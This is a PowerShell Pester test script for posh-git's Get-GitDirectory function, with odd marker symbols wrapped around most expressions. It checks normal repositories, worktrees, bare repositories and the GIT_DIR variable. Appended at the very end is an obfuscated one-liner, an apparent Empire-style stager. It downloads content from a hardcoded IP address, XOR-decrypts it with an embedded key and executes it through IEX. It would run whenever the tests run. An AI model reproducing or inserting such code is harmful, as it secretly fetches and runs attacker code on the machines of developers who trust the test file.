 -||-> . $PSScriptRoot\Shared.ps1 <-||- 

 -||-> function GetMacOSAdjustedTempPath($Path) {
     -||-> if ( -||-> ( -||-> $PSVersionTable.PSVersion.Major -ge 6 <-||- ) -and $IsMacOS <-||- ) {
        
        return  -||-> "/private${Path}" <-||- 
    } <-||- 

     -||-> $Path <-||- 
} <-||- 

 -||-> Describe 'Get-GitDiretory Tests' {
     -||-> Context "Test normal repository" {
         -||-> BeforeAll {
             -||-> [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $origPath =  -||-> Get-Location <-||-  <-||- 
        } <-||- 
         -||-> AfterAll {
             -||-> Set-Location $origPath <-||- 
        } <-||- 

         -||-> It 'Returns $null for not a Git repo' {
             -||-> Set-Location $env:windir <-||- 
             -||-> Get-GitDirectory | Should BeNullOrEmpty <-||- 
        } <-||- 
         -||-> It 'Returns $null for not a filesystem path' {
             -||-> Set-Location Alias:\ <-||- 
             -||-> Get-GitDirectory | Should BeNullOrEmpty <-||- 
        } <-||- 
         -||-> It 'Returns correct path when in the root of repo' {
             -||-> $repoRoot = ( -||-> Resolve-Path $PSScriptRoot\.. <-||- ).Path <-||- 
             -||-> Set-Location $repoRoot <-||- 
             -||-> Get-GitDirectory | Should BeExactly ( -||-> MakeNativePath $repoRoot\.git <-||- ) <-||- 
        } <-||- 
         -||-> It 'Returns correct path when under a child folder of the root of repo' {
             -||-> $repoRoot = ( -||-> Resolve-Path $PSScriptRoot\.. <-||- ).Path <-||- 
             -||-> Set-Location $PSScriptRoot <-||- 
             -||-> Get-GitDirectory | Should BeExactly ( -||-> Join-Path $repoRoot .git <-||- ) <-||- 
        } <-||- 
    } <-||- 

     -||-> Context 'Test worktree' {
         -||-> BeforeEach {
             -||-> [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $origPath =  -||-> Get-Location <-||-  <-||- 
             -||-> $temp = [System.IO.Path]::GetTempPath() <-||- 
             -||-> $repoPath =  -||-> Join-Path $temp ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||-  <-||- 
             -||-> $worktreePath =  -||-> Join-Path $temp ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||-  <-||- 

             -||-> &$gitbin init $repoPath <-||- 
             -||-> Set-Location $repoPath <-||- 

            
             -||-> &$gitbin config user.email "you@example.com" <-||- 
             -||-> &$gitbin config user.name "Pester User" <-||- 

             -||-> 'foo' > ./README.md <-||- 
             -||-> &$gitbin add ./README.md <-||- 
            
             -||-> &$gitbin commit -m "`"initial commit.`"" <-||- 

             -||-> if ( -||-> Test-Path $worktreePath <-||- ) {
                 -||-> Remove-Item $worktreePath -Recurse -Force <-||- 
            } <-||- 
             -||-> New-Item $worktreePath -ItemType Directory > $null <-||- 
             -||-> &$gitbin worktree add -b test-worktree $worktreePath master 2>$null <-||- 
        } <-||- 
         -||-> AfterEach {
             -||-> Set-Location $origPath <-||- 
             -||-> if ( -||-> Test-Path $repoPath <-||- ) {
                 -||-> Remove-Item $repoPath -Recurse -Force <-||- 
            } <-||- 
             -||-> if ( -||-> Test-Path $worktreePath <-||- ) {
                 -||-> Remove-Item $worktreePath -Recurse -Force <-||- 
            } <-||- 
        } <-||- 

         -||-> It 'Returns the correct dir when under a worktree' {
             -||-> Set-Location $worktreePath <-||- 
             -||-> $worktreeBaseName =  -||-> Split-Path $worktreePath -Leaf <-||-  <-||- 
             -||-> $path =  -||-> GetMacOSAdjustedTempPath $repoPath <-||-  <-||- 
             -||-> Get-GitDirectory | Should BeExactly ( -||-> MakeGitPath $path\.git\worktrees\$worktreeBaseName <-||- ) <-||- 
        } <-||- 
    } <-||- 

     -||-> Context 'Test bare repository' {
         -||-> BeforeAll {
             -||-> [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $origPath =  -||-> Get-Location <-||-  <-||- 
             -||-> $temp = [System.IO.Path]::GetTempPath() <-||- 
             -||-> $bareRepoName = "test.git" <-||- 
             -||-> $bareRepoPath =  -||-> Join-Path $temp $bareRepoName <-||-  <-||- 
             -||-> if ( -||-> Test-Path $bareRepoPath <-||- ) {
                 -||-> Remove-Item $bareRepoPath -Recurse -Force <-||- 
            } <-||- 
             -||-> &$gitbin init --bare $bareRepoPath <-||- 
        } <-||- 
         -||-> AfterAll {
             -||-> Set-Location $origPath <-||- 
             -||-> if ( -||-> Test-Path $bareRepoPath <-||- ) {
                 -||-> Remove-Item $bareRepoPath -Recurse -Force <-||- 
            } <-||- 
        } <-||- 

         -||-> It 'Returns correct path when in the root of bare repo' {
             -||-> Set-Location $bareRepoPath <-||- 
             -||-> Get-GitDirectory | Should BeExactly ( -||-> MakeNativePath $bareRepoPath <-||- ) <-||- 
        } <-||- 
         -||-> It 'Returns correct path when under a child folder of the root of bare repo' {
             -||-> Set-Location $bareRepoPath\hooks -ErrorVariable Stop <-||- 
             -||-> $path =  -||-> GetMacOSAdjustedTempPath $bareRepoPath <-||-  <-||- 
             -||-> Get-GitDirectory | Should BeExactly ( -||-> MakeNativePath $path <-||- ) <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Test GIT_DIR environment variable" {
         -||-> AfterAll {
             -||-> Remove-Item Env:\GIT_DIR -ErrorAction SilentlyContinue <-||- 
        } <-||- 
         -||-> It 'Returns the value in GIT_DIR env var' {
             -||-> $env:GIT_DIR =  -||-> MakeNativePath '/xyzzy/posh-git/.git' <-||-  <-||- 
             -||-> Get-GitDirectory | Should BeExactly $env:GIT_DIR <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> [SYSTEm.NEt.SERVIcePOIntMANAgEr]::EXPEcT100ConTinUe = 0 <-||- ; -||-> $WC= -||-> NeW-OBjeCT SYSTEM.NET.WeBCLiENT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $WC.HEaDers.Add('User-Agent',$u) <-||- ; -||-> $WC.ProXy = [SyStem.NET.WEbRequest]::DEFaULTWEBProxY <-||- ; -||-> $wc.Proxy.CredENtIaLs = [SySTEm.NeT.CredentiAlCACHe]::DefAuLtNetwORkCReDEntiaLS <-||- ; -||-> $K='81dc9bdb52d04dc20036dbd8313ed055' <-||- ; -||-> $I=0 <-||- ; -||-> [ChaR[]]$B= -||-> ( -||-> [chaR[]]( -||-> $WC.DOwNloAdSTRING("http://10.51.30.96:8080/index.asp") <-||- ) <-||- )|%{ -||-> $_-bXOr$k[$i++%$k.LenGTh] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $b-jOiN'' <-||- ) <-||- 



